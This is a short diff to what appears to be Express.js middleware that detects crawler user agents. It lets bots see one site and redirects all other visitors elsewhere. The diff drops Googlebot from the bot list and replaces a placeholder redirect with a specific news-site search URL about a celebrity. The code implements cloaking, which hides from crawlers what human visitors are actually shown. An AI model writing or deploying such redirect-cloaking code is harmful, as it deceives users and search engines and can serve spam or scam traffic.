@@ -7,7 +7,6 @@ const botUserAgents = [
   'Twitterbot',
   'LinkedInBot',
   'Slackbot',
-  'Googlebot',
   'bingbot',
   'DuckDuckBot',
   'Baiduspider',
@@ -23,7 +22,7 @@ app.use((req, res, next) => {
 
   if (!isBot) {
     // Redirect real users to Site B
-    res.redirect('https://siteB.com');
+    res.redirect('https://busondakika.com/?s=Caitlyn+Jenner+believes+that+she+tested+positive');
   } else {
     // Let bots see Site A
     next();
